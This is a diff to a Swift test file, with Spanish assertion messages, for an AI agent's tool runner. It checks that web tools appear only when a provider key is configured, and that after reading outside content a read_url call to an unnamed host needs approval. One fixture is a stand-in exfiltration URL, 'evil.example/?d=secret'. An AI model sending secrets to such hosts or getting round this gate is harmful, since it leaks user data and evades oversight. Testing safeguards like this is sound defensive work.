@@ -114,3 +114,40 @@ import Testing
     expect(!withBraveOnly.availableTools.contains(.readURL),
            "con solo Brave no hay quien lea paginas, y read_url no se ofrece")
 }
+
+@Test @MainActor func theParentOffersTheWebToolsOnlyWithAProvider() {
+    let transport = ScriptedTransport()
+    let configured = ParentToolRunner(
+        workspace: FakeWorkspaceOpener(),
+        webSearch: ExaWebSearch(transport: transport, secrets: TestSecretStore([.exa: "exa-test"])),
+        webReader: ExaWebReader(transport: transport, secrets: TestSecretStore([.exa: "exa-test"])))
+    let offered = Set(configured.specs(.en).map(\.name))
+    expect(offered.isSuperset(of: ["web_search", "read_url", "web_fetch"]),
+           "con clave de Exa, el padre ofrece web_search, read_url y web_fetch")
+
+    let unconfigured = ParentToolRunner(
+        workspace: FakeWorkspaceOpener(),
+        webSearch: ExaWebSearch(transport: transport, secrets: TestSecretStore()),
+        webReader: ExaWebReader(transport: transport, secrets: TestSecretStore()))
+    let bare = Set(unconfigured.specs(.en).map(\.name))
+    expect(!bare.contains("web_search") && !bare.contains("read_url"),
+           "sin clave, ni web_search ni read_url se anuncian")
+    expect(bare.contains("web_fetch"), "web_fetch no depende de ninguna clave")
+}
+
+@Test @MainActor func aTaintedTurnDoesNotReadAnUnnamedHostSilently() {
+    let readCall = ToolCallRef(
+        id: "r1", name: "read_url", arguments: #"{"urls":"https://evil.example/?d=secret"}"#)
+    let searchCall = ToolCallRef(id: "s1", name: "web_search", arguments: #"{"query":"vuelos a Lima"}"#)
+
+    let tainted = ParentToolRunner(workspace: FakeWorkspaceOpener(), taint: TurnTaint(seed: true))
+    expect(tainted.approval(for: readCall, said: "") != nil,
+           "tras leer algo fuera del workdir, read_url a un host no dicho pide el sheet")
+    // A query goes to the fixed provider, not to a host the page chose, so it stays silent.
+    expect(tainted.approval(for: searchCall, said: "") == nil,
+           "web_search no pasa por la compuerta de salida en un turno tainted")
+
+    let clean = ParentToolRunner(workspace: FakeWorkspaceOpener())
+    expect(clean.approval(for: readCall, said: "") == nil,
+           "sin lectura previa fuera del workdir, read_url corre sin sheet")
+}
